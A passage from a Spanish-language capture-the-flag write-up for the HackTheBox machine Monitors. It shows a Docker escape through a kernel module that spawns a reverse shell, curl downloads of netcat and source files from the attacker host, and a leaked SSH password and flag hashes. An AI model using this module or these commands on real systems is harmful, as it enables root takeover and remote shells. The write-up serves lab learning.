</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> envp[] <span style=color:#f92672>=</span> { <span style=color:#e6db74>&#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;</span>, NULL }; 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>int</span> __init <span style=color:#a6e22e>reverse_shell_init</span>() {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> call_usermodehelper(argv[<span style=color:#ae81ff>0</span>], argv, envp, UMH_WAIT_EXEC);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> __exit <span style=color:#a6e22e>reverse_shell_exit</span>() {
</span></span><span style=display:flex><span>  printk(KERN_INFO <span style=color:#e6db74>&#34;Exiting</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>module_init(reverse_shell_init);
</span></span><span style=display:flex><span>module_exit(reverse_shell_exit);
</span></span></code></pre></div><p><code>Makefile</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-makefile data-lang=makefile><span style=display:flex><span>obj-m <span style=color:#f92672>+=</span>reverse.o
</span></span><span style=display:flex><span><span style=color:#a6e22e>all</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>	make -C /lib/modules/<span style=color:#66d9ef>$(</span>shell uname -r<span style=color:#66d9ef>)</span>/build M<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>PWD<span style=color:#66d9ef>)</span> modules 
</span></span><span style=display:flex><span><span style=color:#a6e22e>clean</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>	make -C /lib/modules/<span style=color:#66d9ef>$(</span>shell uname -r<span style=color:#66d9ef>)</span>/build M<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>PWD<span style=color:#66d9ef>)</span> clean
</span></span></code></pre></div><p>Ahora, transferimos los archivos necesarios para crear el módulo de kernel:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>root@4e5701e892a5:/tmp# curl 10.10.10.238:8000/nc -so .nc
</span></span><span style=display:flex><span>root@4e5701e892a5:/tmp# curl 10.10.10.238:8000/reverse.c -so reverse.c 
</span></span><span style=display:flex><span>root@4e5701e892a5:/tmp# curl 10.10.10.238:8000/Makefile -so Makefile
</span></span><span style=display:flex><span>root@4e5701e892a5:/tmp# chmod +x .nc
</span></span><span style=display:flex><span>root@4e5701e892a5:/tmp# ./.nc -nlvp 4444
</span></span><span style=display:flex><span>Listening on [0.0.0.0] (family 0, port 4444)
</span></span></code></pre></div><p>A continuación, construimos el módulo de kernel y lo ejecutamos (estando en escucha con <code>nc</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>root@4e5701e892a5:/tmp# make
</span></span><span style=display:flex><span>make -C /lib/modules/4.15.0-142-generic/build M=/tmp modules
</span></span><span style=display:flex><span>make[1]: Entering directory &#39;/usr/src/linux-headers-4.15.0-142-generic&#39; 
</span></span><span style=display:flex><span>  CC [M]  /tmp/reverse.o
</span></span><span style=display:flex><span>  Building modules, stage 2.
</span></span><span style=display:flex><span>  MODPOST 1 modules
</span></span><span style=display:flex><span>  CC      /tmp/reverse.mod.o
</span></span><span style=display:flex><span>  LD [M]  /tmp/reverse.ko
</span></span><span style=display:flex><span>make[1]: Leaving directory &#39;/usr/src/linux-headers-4.15.0-142-generic&#39;
</span></span><span style=display:flex><span>root@4e5701e892a5:/tmp# insmod reverse.ko
</span></span></code></pre></div><p>Y finalmente, se consiguen las dos <em>flags</em>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>root@4e5701e892a5:/tmp# ./.nc -nlvp 4444
</span></span><span style=display:flex><span>Listening on [0.0.0.0] (family 0, port 4444)
</span></span><span style=display:flex><span>Connection from 172.17.0.1 40912 received!
</span></span><span style=display:flex><span>bash: cannot set terminal process group (-1): Inappropriate ioctl for device 
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>root@monitors:/# cat /home/marcus/user.txt
</span></span><span style=display:flex><span>efecb015501176da1d8423d3843cfd6b
</span></span><span style=display:flex><span>root@monitors:/# cat /root/root.txt
</span></span><span style=display:flex><span>5650dab3b397032cb92cd8c859e069d1
</span></span></code></pre></div><h2 id=vía-intencionada-para-conseguir-usertxt>Vía intencionada para conseguir <code>user.txt</code></h2><p>Realmente, no había necesidad de conseguir <code>user.txt</code> antes que <code>root.txt</code>. Para conseguir <code>user.txt</code>, la idea era encontrar un <em>script</em> de Bash escondido en el directorio <code>/home/marcus/.backup</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@monitors:/home/marcus$ ls -la
</span></span><span style=display:flex><span>total 40
</span></span><span style=display:flex><span>drwxr-xr-x 5 marcus marcus 4096 Jan 25 15:39 .
</span></span><span style=display:flex><span>drwxr-xr-x 3 root   root   4096 Nov 10  2020 ..
</span></span><span style=display:flex><span>d--x--x--x 2 marcus marcus 4096 Nov 10  2020 .backup
</span></span><span style=display:flex><span>lrwxrwxrwx 1 root   root      9 Nov 10  2020 .bash_history -&gt; /dev/null 
</span></span><span style=display:flex><span>-rw-r--r-- 1 marcus marcus  220 Apr  4  2018 .bash_logout
</span></span><span style=display:flex><span>-rw-r--r-- 1 marcus marcus 3771 Apr  4  2018 .bashrc
</span></span><span style=display:flex><span>drwx------ 2 marcus marcus 4096 Jan 25 15:39 .cache
</span></span><span style=display:flex><span>drwx------ 3 marcus marcus 4096 Nov 10  2020 .gnupg
</span></span><span style=display:flex><span>-rw-r--r-- 1 marcus marcus  807 Apr  4  2018 .profile
</span></span><span style=display:flex><span>-r--r----- 1 root   marcus   84 Jan 25 14:59 note.txt
</span></span><span style=display:flex><span>-r--r----- 1 root   marcus   33 Jul  4 12:16 user.txt
</span></span></code></pre></div><p>Como el directorio solo tiene permisos <code>x</code>, se pueden leer archivos solo si se conoce el nombre completo. Como el directorio se llama <code>.backup</code>, se puede tratar de adivinar qué tipo de archivos habrá dentro:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@monitors:/home/marcus$ cat .backup/backup.sh 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>backup_name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;cacti_backup&#34;</span>
</span></span><span style=display:flex><span>config_pass<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;VerticalEdge2020&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>zip /tmp/<span style=color:#e6db74>${</span>backup_name<span style=color:#e6db74>}</span>.zip /usr/share/cacti/cacti/*
</span></span><span style=display:flex><span>sshpass -p <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>config_pass<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span> scp /tmp/<span style=color:#e6db74>${</span>backup_name<span style=color:#e6db74>}</span> 192.168.1.14:/opt/backup_collection/<span style=color:#e6db74>${</span>backup_name<span style=color:#e6db74>}</span>.zip 
</span></span><span style=display:flex><span>rm /tmp/<span style=color:#e6db74>${</span>backup_name<span style=color:#e6db74>}</span>.zip
</span></span></code></pre></div><p>Entonces, se podría acceder como <code>marcus</code> por SSH con contraseña <code>VerticalEdge2020</code>, y obtener una pista de que el contenedor de Docker podría ser vulnerable (<code>note.txt</code>). Además, se podría utilizar SSH para el reenvío de puertos en lugar de <a href=https://github.com/jpillora/chisel><code>chisel</code></a>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@monitors:/home/marcus$ su marcus
</span></span><span style=display:flex><span>Password:
</span></span><span style=display:flex><span>marcus@monitors:~$ cat note.txt
</span></span><span style=display:flex><span>TODO:
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Disable phpinfo in php.ini              - DONE 
</span></span><span style=display:flex><span>Update docker image for production use  -
</span></span><span style=display:flex><span>marcus@monitors:~$ cat user.txt
</span></span><span style=display:flex><span>efecb015501176da1d8423d3843cfd6b
</span></span></code></pre></div><div class="mt6 instapaper_ignoref">
</div></div><aside aria-label=aside class="w-20-l mt6-l aside-desktop">
<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
<p class="f5 b mb3">Contenidos de este write-up</p><nav id=TableOfContents>
<ul>
<li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#exploración-web>Exploración web</a></li><li><a href=#explotando-el-_plugin_-wordpress-spritz>Explotando el <em>plugin</em> Wordpress Spritz</a></li><li><a href=#explotando-cacti>Explotando Cacti</a></li><li><a href=#intrusión-en-la-máquina>Intrusión en la máquina</a></li><li><a href=#analizando-el-contenedor-de-docker>Analizando el contenedor de Docker</a></li><li><a href=#explotando-ofbiz>Explotando OFBiz</a></li><li><a href=#escapando-del-contenedor-de-docker>Escapando del contenedor de Docker</a></li><li><a href=#vía-intencionada-para-conseguir-usertxt>Vía intencionada para conseguir <code>user.txt</code></a></li></ul></nav></div></aside></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo>
<div class="flex justify-between">
<a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a>
<div style=margin-top:8px>
<div>
<div>
<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div></div></div></div></footer></body></html>